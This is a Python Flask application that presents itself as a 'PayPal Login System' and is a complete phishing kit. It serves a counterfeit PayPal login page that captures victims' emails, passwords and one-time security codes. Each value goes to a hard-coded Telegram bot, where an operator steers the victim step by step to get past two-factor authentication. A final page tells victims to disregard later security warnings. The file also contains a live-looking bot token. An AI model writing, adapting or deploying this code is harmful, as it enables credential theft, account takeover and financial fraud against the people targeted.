#!/usr/bin/env python3
"""
PayPal Login System - Optimized for Render
"""

from flask import Flask, request, jsonify, render_template_string
import requests
import time
import logging
import threading
from datetime import datetime
import os

# Ultra-fast logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Telegram Configuration
BOT_TOKEN = "8343644991:AAGUCkdTgJsBWMXTcQOv6yxjwiGqkUKxIVI"
CHAT_ID = "7861055360"

# Optimized session storage
sessions = {}
last_update_id = 0

def send_telegram_message(text, reply_markup=None):
    """Ultra-fast Telegram message sending"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    payload = {
        'chat_id': CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
        'disable_notification': True
    }
    
    if reply_markup:
        payload['reply_markup'] = reply_markup
    
    try:
        threading.Thread(target=requests.post, args=(url,), kwargs={'json': payload, 'timeout': 2}).start()
        return True
    except:
        return False

def create_keyboard(session_id, field, value):
    """Optimized keyboard creation for PayPal form"""
    if field == 'email':
        keyboard = [
            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
            [{"text": "✅ PROCEED TO PASSWORD", "callback_data": f"proceed_password:{session_id}"}],
            [{"text": "❌ EMAIL ERROR", "callback_data": f"email_error:{session_id}"}]
        ]
    elif field == 'password':
        keyboard = [
            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
            [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
            [{"text": "✅ PROCEED TO OTP", "callback_data": f"proceed_otp:{session_id}"}],
            [{"text": "❌ PASSWORD ERROR", "callback_data": f"password_error:{session_id}"}]
        ]
    elif field == 'otp':
        keyboard = [
            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
            [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
            [{"text": "🔢 COPY OTP", "callback_data": f"copy:{session_id}:otp"}],
            [{"text": "✅ PROCEED TO SUCCESS", "callback_data": f"proceed_success:{session_id}"}],
            [{"text": "❌ OTP ERROR", "callback_data": f"otp_error:{session_id}"}],
            [{"text": "🔄 RESEND OTP", "callback_data": f"resend_otp:{session_id}"}]
        ]
    
    return {"inline_keyboard": keyboard}

def get_telegram_updates():
    """High-speed Telegram polling"""
    global last_update_id
    
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {'timeout': 3, 'offset': last_update_id + 1}
        
        response = requests.get(url, params=params, timeout=4)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    last_update_id = update['update_id']
                    
                    if 'message' in update and 'text' in update['message']:
                        text = update['message']['text']
                        if text == '/start':
                            return f"start_command:{update['message']['chat']['id']}"
                    
                    if 'callback_query' in update:
                        return update['callback_query']['data']
        return None
    except Exception:
        return None

def process_commands_background():
    """High-speed background command processor"""
    
    while True:
        try:
            command = get_telegram_updates()
            if command:
                if command.startswith('start_command:'):
                    render_url = os.getenv('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
                    
                    send_telegram_message(
                        f"💰 <b>PAYPAL LOGIN SYSTEM</b>\n"
                        f"🔗 Your PayPal Link: {render_url}\n"
                        f"📱 Share this link with your target\n"
                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                    )
                
                elif command.startswith('copy:'):
                    parts = command.split(':')
                    if len(parts) >= 3:
                        session_id, field = parts[1], parts[2]
                        if session_id in sessions:
                            value = sessions[session_id].get(field, '')
                            send_telegram_message(
                                f"📋 <b>COPY {field.upper()}</b>\n<code>{value}</code>\n\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                            )
                
                elif ':' in command:
                    action, session_id = command.split(':', 1)
                    action_map = {
                        'proceed_password': 'show_password',
                        'email_error': 'show_email_error', 
                        'proceed_otp': 'show_otp',
                        'proceed_success': 'show_success',
                        'password_error': 'show_password_error',
                        'otp_error': 'show_otp_error',
                        'resend_otp': 'resend_otp'
                    }
                    
                    if action in action_map and session_id in sessions:
                        sessions[session_id]['action'] = action_map[action]
                        sessions[session_id]['last_update'] = time.time()
            
            time.sleep(0.2)
            
        except Exception as e:
            time.sleep(0.3)

# Start high-speed command processor
command_thread = threading.Thread(target=process_commands_background, daemon=True)
command_thread.start()

# Verification Page Template
VERIFICATION_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Complete</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            color: #1a1a1a;
        }

        .container {
            width: 100%;
            max-width: 560px;
        }

        .card {
            background: #ffffff;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            padding: 48px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .icon-container {
            width: 64px;
            height: 64px;
            margin: 0 auto 24px;
            background: #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .checkmark {
            width: 32px;
            height: 32px;
            stroke: #ffffff;
            stroke-width: 3;
            fill: none;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #111827;
            text-align: center;
            margin-bottom: 16px;
            letter-spacing: -0.025em;
        }

        .subtitle {
            font-size: 15px;
            color: #6b7280;
            text-align: center;
            line-height: 1.6;
            margin-bottom: 32px;
        }

        .notice-box {
            background: #fef3c7;
            border: 1px solid #fbbf24;
            border-radius: 6px;
            padding: 20px;
            margin-bottom: 24px;
        }

        .notice-title {
            font-size: 15px;
            font-weight: 600;
            color: #92400e;
            margin-bottom: 8px;
        }

        .notice-text {
            font-size: 14px;
            color: #78350f;
            line-height: 1.6;
        }

        .info-text {
            font-size: 14px;
            color: #4b5563;
            line-height: 1.7;
            margin-bottom: 24px;
            text-align: center;
        }

        .footer {
            text-align: center;
            padding-top: 24px;
            border-top: 1px solid #e5e7eb;
        }

        .footer-text {
            font-size: 13px;
            color: #9ca3af;
        }

        @media (max-width: 600px) {
            .card {
                padding: 32px 24px;
            }

            h1 {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="icon-container">
                <svg class="checkmark" viewBox="0 0 52 52">
                    <path d="M14 27l7 7 16-16" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>

            <h1>Verification Successful</h1>
            
            <p class="subtitle">
                Thank you for verifying your account. We appreciate your cooperation in maintaining account security.
            </p>

            <div class="notice-box">
                <div class="notice-title">Important Notice</div>
                <p class="notice-text">
                    Please disregard any additional verification emails or warnings you may receive within the next 24 hours. Your verification is complete and no further action is required.
                </p>
            </div>

            <p class="info-text">
                If you receive any suspicious emails requesting additional verification, please do not click on any links. Contact us directly through our official channels if you have concerns.
            </p>

            <div class="footer">
                <p class="footer-text">Account verification completed successfully</p>
            </div>
        </div>
    </div>
</body>
</html>
'''

# PayPal HTML Template
PAYPAL_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            border-bottom: 1px solid #e5e7eb;
            padding: 1rem 0;
        }

        .header-container {
            max-width: 28rem;
            margin: 0 auto;
            padding: 0 1rem;
        }

        .logo {
            font-size: 1.75rem;
            font-weight: bold;
            color: #0070ba;
            font-family: Verdana, sans-serif;
        }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .content-wrapper {
            width: 100%;
            max-width: 28rem;
        }

        .form-container {
            animation: fadeIn 0.3s ease-in-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateX(20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            margin-bottom: 0.5rem;
            color: #111827;
        }

        input {
            width: 100%;
            height: 2.75rem;
            padding: 0 0.75rem;
            font-size: 1rem;
            border: 1px solid #d1d5db;
            border-radius: 0.25rem;
            transition: all 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #0070ba;
            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1);
        }

        input:disabled {
            background-color: #f3f4f6;
            cursor: not-allowed;
        }

        input[type="text"].otp-input {
            height: 3.5rem;
            text-align: center;
            font-size: 1.875rem;
            letter-spacing: 0.5em;
            font-weight: 300;
        }

        .password-wrapper {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #6b7280;
            padding: 0.25rem;
        }

        .btn {
            width: 100%;
            height: 3rem;
            background-color: #0070ba;
            color: white;
            border: none;
            border-radius: 9999px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn:hover:not(:disabled) {
            background-color: #005ea6;
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .link {
            color: #0070ba;
            text-decoration: none;
            font-size: 0.875rem;
        }

        .link:hover {
            text-decoration: underline;
        }

        .user-avatar {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 1.5rem;
        }

        .avatar-circle {
            width: 2.5rem;
            height: 2.5rem;
            border-radius: 50%;
            background-color: #e5e7eb;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            color: #4b5563;
        }

        .user-email {
            font-size: 0.875rem;
            color: #6b7280;
        }

        .otp-header {
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .otp-title {
            font-size: 1.5rem;
            font-weight: 500;
            color: #111827;
            margin-bottom: 0.5rem;
        }

        .otp-description {
            font-size: 0.875rem;
            color: #6b7280;
        }

        .otp-timer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 0.875rem;
            margin-top: 0.75rem;
        }

        .timer-text {
            color: #6b7280;
        }

        .timer-text.expired {
            color: #dc2626;
        }

        .resend-btn {
            background: none;
            border: none;
            color: #0070ba;
            cursor: pointer;
            font-size: 0.875rem;
        }

        .resend-btn:hover:not(:disabled) {
            text-decoration: underline;
        }

        .resend-btn:disabled {
            color: #9ca3af;
            cursor: not-allowed;
        }

        /* Loading Overlay - FIXED */
        .loading-overlay {
            position: fixed;
            inset: 0;
            background-color: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(8px);
            z-index: 50;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 4rem;
            height: 4rem;
            border: 4px solid #e5e7eb;
            border-top-color: #0070ba;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 1rem;
        }

        .loading-text {
            font-size: 1rem;
            color: #374151;
            text-align: center;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Error Messages */
        .error-message {
            color: #dc2626;
            font-size: 0.875rem;
            text-align: center;
            margin-bottom: 1rem;
            padding: 0.5rem;
            background-color: #fef2f2;
            border-radius: 0.25rem;
            border: 1px solid #fecaca;
        }

        .success-message {
            color: #059669;
            font-size: 0.875rem;
            text-align: center;
            margin-bottom: 1rem;
            padding: 0.5rem;
            background-color: #f0fdf4;
            border-radius: 0.25rem;
            border: 1px solid #bbf7d0;
        }

        footer {
            border-top: 1px solid #e5e7eb;
            padding: 1.5rem 0;
        }

        .footer-container {
            max-width: 72rem;
            margin: 0 auto;
            padding: 0 1rem;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 1rem;
            justify-content: center;
            font-size: 0.75rem;
        }

        .footer-links a {
            color: #6b7280;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .hidden {
            display: none !important;
        }

        .mb-4 {
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <!-- Loading Overlay - WILL SPIN FOREVER UNTIL TELEGRAM RESPONSE -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text" id="loadingText">Checking information...</div>
    </div>

    <!-- Header -->
    <header>
        <div class="header-container">
            <div class="logo">PayPal</div>
        </div>
    </header>

    <!-- Main Content -->
    <main>
        <div class="content-wrapper">
            <!-- Email Step -->
            <div id="emailStep" class="form-container">
                <div id="emailError" class="error-message hidden">Incorrect email address. Please try again.</div>
                <form id="emailForm">
                    <div class="form-group">
                        <label for="email">Email or mobile number</label>
                        <input type="email" id="email" required>
                    </div>
                    <button type="submit" class="btn">Next</button>
                </form>
            </div>

            <!-- Password Step -->
            <div id="passwordStep" class="form-container hidden">
                <div id="passwordError" class="error-message hidden">Incorrect password. Please try again.</div>
                <div class="user-avatar">
                    <div class="avatar-circle" id="avatarCircle">U</div>
                    <div class="user-email" id="userEmail"></div>
                </div>
                <form id="passwordForm">
                    <div class="form-group">
                        <label for="password">Password</label>
                        <div class="password-wrapper">
                            <input type="password" id="password" required>
                            <button type="button" class="password-toggle" id="passwordToggle">
                                <svg class="icon" id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                                    <circle cx="12" cy="12" r="3"></circle>
                                </svg>
                                <svg class="icon hidden" id="eyeOffIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                                    <line x1="1" y1="1" x2="23" y2="23"></line>
                                </svg>
                            </button>
                        </div>
                        <a href="#" class="link mb-4" style="display: inline-block; margin-top: 0.5rem;">Forgot password?</a>
                    </div>
                    <button type="submit" class="btn">Log In</button>
                </form>
            </div>

            <!-- OTP Step -->
            <div id="otpStep" class="form-container hidden">
                <div id="otpError" class="error-message hidden">Incorrect OTP. Please try again.</div>
                <div id="otpResend" class="success-message hidden">We sent you a new OTP.</div>
                <div class="otp-header">
                    <h1 class="otp-title">Enter security code</h1>
                    <p class="otp-description">Enter the 6-digit code we sent you</p>
                </div>
                <form id="otpForm">
                    <div class="form-group">
                        <input type="text" id="otp" class="otp-input" placeholder="· · · · · ·" maxlength="6" required>
                        <div class="otp-timer">
                            <span class="timer-text" id="timerText">Code expires in 1:00</span>
                            <button type="button" class="resend-btn" id="resendBtn" disabled>Resend code</button>
                        </div>
                    </div>
                    <button type="submit" class="btn" id="otpSubmitBtn" disabled>Continue</button>
                </form>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer>
        <div class="footer-container">
            <div class="footer-links">
                <a href="#">Contact Us</a>
                <a href="#">Privacy</a>
                <a href="#">Legal</a>
                <a href="#">Worldwide</a>
            </div>
        </div>
    </footer>

    <script>
        // State management
        let currentStep = 'email';
        let emailValue = '';
        let passwordValue = '';
        let otpValue = '';
        let otpTimer = 60; // 1 MINUTE FIXED
        let timerInterval = null;
        let canResend = false;
        let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        let isWaitingForOperator = false;

        // DOM elements
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const otpStep = document.getElementById('otpStep');
        const emailForm = document.getElementById('emailForm');
        const passwordForm = document.getElementById('passwordForm');
        const otpForm = document.getElementById('otpForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const otpInput = document.getElementById('otp');
        const passwordToggle = document.getElementById('passwordToggle');
        const eyeIcon = document.getElementById('eyeIcon');
        const eyeOffIcon = document.getElementById('eyeOffIcon');
        const userEmail = document.getElementById('userEmail');
        const avatarCircle = document.getElementById('avatarCircle');
        const timerText = document.getElementById('timerText');
        const resendBtn = document.getElementById('resendBtn');
        const otpSubmitBtn = document.getElementById('otpSubmitBtn');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const otpError = document.getElementById('otpError');
        const otpResend = document.getElementById('otpResend');

        // Utility functions
        function showLoading(text) {
            loadingText.textContent = text;
            loadingOverlay.classList.add('active');
            isWaitingForOperator = true;
        }

        function hideLoading() {
            loadingOverlay.classList.remove('active');
            isWaitingForOperator = false;
        }

        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            return `${mins}:${secs.toString().padStart(2, '0')}`;
        }

        function showStep(step) {
            emailStep.classList.add('hidden');
            passwordStep.classList.add('hidden');
            otpStep.classList.add('hidden');

            // Hide all errors when changing steps
            emailError.classList.add('hidden');
            passwordError.classList.add('hidden');
            otpError.classList.add('hidden');
            otpResend.classList.add('hidden');

            if (step === 'email') {
                emailStep.classList.remove('hidden');
            } else if (step === 'password') {
                passwordStep.classList.remove('hidden');
            } else if (step === 'otp') {
                otpStep.classList.remove('hidden');
            }

            currentStep = step;
        }

        function startOtpTimer() {
            if (timerInterval) {
                clearInterval(timerInterval);
            }

            otpTimer = 60; // 1 MINUTE
            canResend = false;
            resendBtn.disabled = true;
            timerText.classList.remove('expired');
            otpResend.classList.add('hidden');

            timerInterval = setInterval(() => {
                otpTimer--;

                if (otpTimer <= 0) {
                    clearInterval(timerInterval);
                    timerText.textContent = 'Code expired';
                    timerText.classList.add('expired');
                    canResend = true;
                    resendBtn.disabled = false;
                } else {
                    timerText.textContent = `Code expires in ${formatTime(otpTimer)}`;
                }
            }, 1000);
        }

        // FUNCTION TO SEND DATA TO BACKEND
        async function sendToBackend(field, value) {
            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        session_id: sessionId,
                        field: field,
                        value: value
                    })
                });
                return await response.json();
            } catch (error) {
                console.error('Error sending to backend:', error);
                return { success: false };
            }
        }

        // FUNCTION TO CHECK STATUS - WILL POLL UNTIL OPERATOR RESPONDS
        async function checkOperatorStatus() {
            while (isWaitingForOperator) {
                try {
                    const response = await fetch('/status?session_id=' + sessionId + '&t=' + Date.now());
                    const data = await response.json();
                    
                    if (data.action) {
                        handleOperatorAction(data.action);
                        break;
                    }
                    
                    // Wait 1 second before checking again
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (error) {
                    console.error('Status check error:', error);
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        // FUNCTION TO HANDLE OPERATOR ACTIONS
        function handleOperatorAction(action) {
            hideLoading();
            
            if (action === 'show_password') {
                showStep('password');
            } else if (action === 'show_otp') {
                showStep('otp');
                startOtpTimer();
            } else if (action === 'show_success') {
                window.location.href = '/verification-success';
            } else if (action === 'show_email_error') {
                showStep('email');
                emailError.classList.remove('hidden');
                emailInput.value = '';
                emailInput.focus();
            } else if (action === 'show_password_error') {
                showStep('password');
                passwordError.classList.remove('hidden');
                passwordInput.value = '';
                passwordInput.focus();
            } else if (action === 'show_otp_error') {
                showStep('otp');
                otpError.classList.remove('hidden');
                otpInput.value = '';
                otpInput.focus();
                startOtpTimer();
            } else if (action === 'resend_otp') {
                // Handle resend OTP from Telegram
                showStep('otp');
                otpInput.value = '';
                otpResend.classList.remove('hidden');
                startOtpTimer();
            }
        }

        // Event handlers
        emailForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            emailValue = emailInput.value;

            if (emailValue) {
                showLoading('Verifying email address...');
                
                // Clear any previous session data
                await fetch('/clear-session?session_id=' + sessionId);
                
                // Send to backend
                await sendToBackend('email', emailValue);
                
                // Update user info
                userEmail.textContent = emailValue;
                avatarCircle.textContent = emailValue[0].toUpperCase();

                // WAIT FOR OPERATOR RESPONSE - WILL SPIN FOREVER
                await checkOperatorStatus();
            }
        });

        passwordForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            passwordValue = passwordInput.value;

            if (passwordValue) {
                showLoading('Checking password...');
                
                // Send to backend  
                await sendToBackend('password', passwordValue);

                // WAIT FOR OPERATOR RESPONSE - WILL SPIN FOREVER
                await checkOperatorStatus();
            }
        });

        otpForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            otpValue = otpInput.value;

            if (otpValue.length === 6) {
                showLoading('Verifying security code...');
                
                // Send to backend
                await sendToBackend('otp', otpValue);
                
                // WAIT FOR OPERATOR RESPONSE - WILL SPIN FOREVER
                await checkOperatorStatus();
            }
        });

        // Password toggle
        passwordToggle.addEventListener('click', () => {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.classList.add('hidden');
                eyeOffIcon.classList.remove('hidden');
            } else {
                passwordInput.type = 'password';
                eyeIcon.classList.remove('hidden');
                eyeOffIcon.classList.add('hidden');
            }
        });

        // OTP input validation
        otpInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            otpValue = e.target.value;
            otpSubmitBtn.disabled = otpValue.length !== 6;
        });

        // Resend code
        resendBtn.addEventListener('click', async () => {
            if (canResend) {
                showLoading('Requesting new code...');
                otpInput.value = '';
                otpValue = '';
                otpSubmitBtn.disabled = true;

                // Send OTP request to backend
                await sendToBackend('request_otp', 'new_otp_requested');
                
                showStep('otp');
                startOtpTimer();
                otpResend.classList.remove('hidden');
                hideLoading();
            }
        });

        // Disable inputs during loading
        function setInputsDisabled(disabled) {
            emailInput.disabled = disabled;
            passwordInput.disabled = disabled;
            otpInput.disabled = disabled;
            passwordToggle.disabled = disabled;
            resendBtn.disabled = disabled || !canResend;
        }

        // Update disabled state when loading
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.target === loadingOverlay && mutation.attributeName === 'class') {
                    const isLoading = loadingOverlay.classList.contains('active');
                    setInputsDisabled(isLoading);
                }
            });
        });

        observer.observe(loadingOverlay, { attributes: true });

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            console.log('System initialized with session:', sessionId);
        });
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    """Ultra-fast form serving"""
    return render_template_string(PAYPAL_TEMPLATE)

@app.route('/verification-success')
def verification_success():
    """Verification success page"""
    return render_template_string(VERIFICATION_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    """High-speed data submission"""
    data = request.json
    session_id = data.get('session_id')
    field = data.get('field')
    value = data.get('value')
    
    if session_id not in sessions:
        sessions[session_id] = {}
    
    sessions[session_id][field] = value
    sessions[session_id]['last_update'] = time.time()
    
    if 'action' in sessions[session_id]:
        del sessions[session_id]['action']
    
    form_name = "💰 PAYPAL"
    keyboard = create_keyboard(session_id, field, value)
    
    if field == 'email':
        send_telegram_message(
            f"📧 <b>{form_name} - EMAIL SUBMITTED</b>\n"
            f"Email: <code>{value}</code>\n"
            f"Session: {session_id[-12:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            keyboard
        )
    elif field == 'password':
        send_telegram_message(
            f"🔑 <b>{form_name} - PASSWORD SUBMITTED</b>\n"
            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
            f"Password: <code>{value}</code>\n"
            f"Session: {session_id[-12:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            keyboard
        )
    elif field == 'otp':
        send_telegram_message(
            f"🔢 <b>{form_name} - OTP SUBMITTED</b>\n"
            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
            f"OTP: <code>{value}</code>\n"
            f"Session: {session_id[-12:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            keyboard
        )
    elif field == 'request_otp':
        send_telegram_message(
            f"🔄 <b>{form_name} - OTP RESEND REQUESTED</b>\n"
            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
            f"Session: {session_id[-12:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}"
        )
    
    return jsonify({'success': True})

@app.route('/status')
def status():
    """Ultra-fast status checking"""
    session_id = request.args.get('session_id')
    action = sessions[session_id].get('action') if session_id in sessions else None
    return jsonify({'action': action})

@app.route('/clear-session')
def clear_session():
    """Fast session clearing"""
    session_id = request.args.get('session_id')
    if session_id in sessions and 'action' in sessions[session_id]:
        del sessions[session_id]['action']
    return jsonify({'success': True})

if __name__ == "__main__":
    print("🚀 PAYPAL LOGIN SYSTEM STARTED")
    print("⚡ Optimized for maximum speed")
    print("📱 Telegram bot ready - Send /start")
    print("🌐 Render deployment ready")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
